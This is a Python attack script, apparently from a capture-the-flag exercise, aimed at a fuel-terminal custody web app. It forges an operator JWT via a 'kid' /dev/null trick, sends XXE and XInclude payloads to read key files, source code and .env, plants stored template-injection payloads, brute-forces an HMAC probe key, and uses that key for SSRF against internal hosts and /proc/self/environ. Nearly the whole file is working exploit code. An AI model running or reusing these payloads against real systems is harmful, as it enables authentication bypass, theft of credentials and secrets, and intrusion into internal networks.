#!/usr/bin/env python3
"""round40 — Read /ops and /ops/custody pages, XInclude, stored SSTI, more files, brute-force"""
import requests, time, json, hmac as hm, hashlib, base64

CASPI = "http://192.168.242.102:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_op():
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":"operator",
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_op()}"}

def xxe_read(path, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=15)
        if r.status_code == 200:
            try:
                d = r.json()
                return "OK", d.get("summary",{}).get(field,"")
            except:
                return "RAW", r.text[:500]
        elif r.status_code == 400:
            return "BIN", r.text[:200]
        else:
            return f"E{r.status_code}", r.text[:200]
    except Exception as e:
        return "ERR", str(e)[:150]

# ============================================================
print("="*70)
print("PHASE 1: /ops PAGE")
print("="*70)

try:
    r = requests.get(f"{CASPI}/ops", headers=AUTH_OP, timeout=10)
    print(f"  [{r.status_code}] ({len(r.text)} bytes)")
    print(r.text[:3000])
except Exception as e:
    print(f"  Error: {e}")

# ============================================================
print("\n"+"="*70)
print("PHASE 2: /ops/custody PAGE (FULL)")
print("="*70)

try:
    r = requests.get(f"{CASPI}/ops/custody", headers=AUTH_OP, timeout=10)
    print(f"  [{r.status_code}] ({len(r.text)} bytes)")
    print(r.text[:5000])
except Exception as e:
    print(f"  Error: {e}")

# ============================================================
print("\n"+"="*70)
print("PHASE 3: XINCLUDE ATTEMPT")
print("="*70)

# Try XInclude to read binary files (bypasses < and & issue)
for target in ["/app/keys/carrier", "/app/keys/operator", "/app/app.py", "/app/entrypoint.sh"]:
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<ticket xmlns:xi="http://www.w3.org/2001/XInclude">
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks><xi:include href="{target}" parse="text"/></remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=10)
        if r.status_code == 200:
            try:
                d = r.json()
                val = d.get("summary",{}).get("remarks","")
                if val:
                    print(f"  [XINCLUDE WORKS!] {target}: '{val[:200]}'")
                else:
                    print(f"  [200 empty] {target}")
            except:
                print(f"  [200 raw] {target}: {r.text[:100]}")
        else:
            print(f"  [{r.status_code}] {target}: {r.text[:100]}")
    except Exception as e:
        print(f"  [ERR] {target}: {e}")

# ============================================================
print("\n"+"="*70)
print("PHASE 4: MORE FILE PATHS")
print("="*70)

more_paths = [
    # Build/deploy files
    "/app/Dockerfile", "/app/docker-compose.yml", "/app/docker-compose.yaml",
    "/app/Makefile", "/app/Procfile",
    "/app/pyproject.toml", "/app/setup.py", "/app/setup.cfg",
    "/app/Pipfile", "/app/Pipfile.lock",
    "/app/poetry.lock", "/app/tox.ini",
    "/app/.dockerignore", "/app/.gitignore",
    # Maybe config is one level up
    "/Dockerfile", "/docker-compose.yml", "/docker-compose.yaml",
    "/config.py", "/settings.py", "/.env",
    # Supervisor
    "/etc/supervisor/conf.d/gunicorn.conf",
    "/etc/nginx/nginx.conf",
    # Look for the actual Python app entry point
    "/app/wsgi.py", "/app/asgi.py",
    "/app/manage.py", "/app/run.py",
    # Maybe templates have SSTI hints
    "/app/templates/ops/diagnostics.html",
    "/app/templates/ops/custody.html",
    "/app/templates/ops/index.html",
    "/app/templates/portal/index.html",
    "/app/templates/auth/login.html",
    "/app/templates/auth/register.html",
]

for fp in more_paths:
    st, val = xxe_read(fp)
    if st == "OK" and val:
        print(f"\n  [FOUND!] {fp}:")
        for line in val.split('\n')[:15]:
            print(f"    {line}")
    elif st == "BIN":
        print(f"  [EXISTS/BINARY] {fp}")

# ============================================================
print("\n"+"="*70)
print("PHASE 5: STORED SSTI — INGEST TICKET THEN VIEW CUSTODY")
print("="*70)

# Ingest a ticket with SSTI payload
ssti_xml = '''<?xml version="1.0" encoding="UTF-8"?>
<ticket>
  <reference>SSTI-{{config}}</reference>
  <tankId>T-01</tankId><product>Diesel</product>
  <grossVolume>100</grossVolume><netVolume>99</netVolume>
  <density>0.85</density><temperature>20</temperature>
  <carrier>{{request.environ}}</carrier>
  <remarks>{{config.items()}}</remarks>
</ticket>'''

try:
    r = S.post(f"{CASPI}/api/ops/custody/ingest",
        data=ssti_xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=10)
    print(f"  Ingest SSTI ticket: [{r.status_code}] {r.text[:150]}")
except Exception as e:
    print(f"  Ingest error: {e}")

# Now check if the custody page renders stored tickets with SSTI
try:
    r = requests.get(f"{CASPI}/ops/custody", headers=AUTH_OP, timeout=10)
    if "config" in r.text.lower() and "{{" not in r.text:
        print("  STORED SSTI! Config rendered in custody page!")
        print(r.text[:2000])
    elif "SSTI-" in r.text:
        print(f"  Ticket visible but SSTI not rendered")
    else:
        print(f"  Ticket not visible in custody page")
except:
    pass

# Also check ticket listing endpoints
for ep in ["/api/ops/custody/list", "/api/ops/custody/tickets",
           "/api/ops/custody", "/ops/custody/list",
           "/ops/custody/tickets"]:
    try:
        r = requests.get(f"{CASPI}{ep}", headers=AUTH_OP, timeout=5)
        if r.status_code == 200 and "SSTI-" in r.text:
            print(f"  [{r.status_code}] {ep}: Ticket found!")
            if "{{" not in r.text and "config" in r.text.lower():
                print(f"  SSTI RENDERED!")
            print(f"    {r.text[:300]}")
    except:
        pass

# ============================================================
print("\n"+"="*70)
print("PHASE 6: 6-CHAR LOWERCASE ALPHA BRUTE-FORCE")
print("="*70)

known_url = b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
known_sig = bytes.fromhex("5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09")

print("  Testing 6-char lowercase alpha probe keys (308M)...")
print("  Estimated time: ~400 seconds (7 min)")
t0 = time.time()
found = False
checked = 0
alpha = b"abcdefghijklmnopqrstuvwxyz"

for b0 in alpha:
    for b1 in alpha:
        p2 = bytes([b0, b1])
        for b2 in alpha:
            p3 = p2 + bytes([b2])
            for b3 in alpha:
                p4 = p3 + bytes([b3])
                for b4 in alpha:
                    p5 = p4 + bytes([b4])
                    for b5 in alpha:
                        key = p5 + bytes([b5])
                        if hm.new(key, known_url, hashlib.sha256).digest() == known_sig:
                            elapsed = time.time() - t0
                            print(f"\n  PROBE KEY FOUND: '{key.decode()}' in {elapsed:.1f}s <<<<<<")
                            found = True
                            break
                    if found: break
                if found: break
                checked += 26
            if found: break
            if checked % (26*26*10) == 0 and checked > 0:
                elapsed = time.time() - t0
                total = 26**6 // 26
                pct = checked / total * 100
                rate = checked * 26 / elapsed if elapsed > 0 else 0
                eta = (total * 26 - checked * 26) / rate if rate > 0 else 999
                print(f"  Progress: {pct:.1f}% ({elapsed:.0f}s, ETA {eta:.0f}s)", end="\r", flush=True)
        if found: break
    if found: break

if not found:
    elapsed = time.time() - t0
    print(f"\n  No 6-char lowercase alpha probe key ({elapsed:.1f}s)")

# ============================================================
if found:
    print("\n"+"="*70)
    print("PHASE 7: SSRF WITH FOUND PROBE KEY!")
    print("="*70)

    probe_key = key
    targets = [
        "http://gauge-gw.internal:9100/",
        "http://gauge-gw.internal:9100/v1/",
        "http://gauge-gw.internal:9100/v1/config",
        "http://gauge-gw.internal:9100/v1/secret",
        "http://gauge-gw.internal:9100/v1/flag",
        "http://gauge-gw.internal:9100/flag",
        "http://gauge-gw.internal:9100/secret",
        "http://gauge-gw.internal:9100/env",
        "http://gauge-gw.internal:9100/health",
        "http://gauge-gw.internal:9100/metrics",
        "http://gauge-gw.internal:9100/v1/admin",
        "http://gauge-gw.internal:9100/v1/meters/",
        "http://gauge-gw.internal:9100/v1/tanks/",
        "http://gauge-gw.internal:9100/v1/tanks/4/level",
        "http://gauge-gw.internal:9100/v1/tanks/5/level",
        "http://gauge-gw.internal:9100/v1/tanks/6/level",
        "http://127.0.0.1:3000/api/auth/me",
        "http://terminal-db:5432/",
        "file:///app/app.py",
        "file:///proc/self/environ",
        "file:///app/keys/carrier",
        "file:///app/keys/operator",
        "file:///app/entrypoint.sh",
    ]

    for url in targets:
        sig = hm.new(probe_key, url.encode(), hashlib.sha256).hexdigest()
        try:
            r = S.post(f"{CASPI}/api/ops/probe",
                json={"url": url, "sig": sig},
                headers=AUTH_OP, timeout=10)
            if r.status_code == 200:
                try:
                    d = r.json()
                    print(f"  [{d.get('status','')}] {url}")
                    body = d.get("body","")[:500]
                    if body:
                        print(f"    {body[:400]}")
                except:
                    print(f"  [200] {url}: {r.text[:200]}")
            else:
                print(f"  [{r.status_code}] {url}: {r.text[:80]}")
        except Exception as e:
            print(f"  [ERR] {url}: {e}")

print("\n"+"="*70)
print("DONE")
print("="*70)
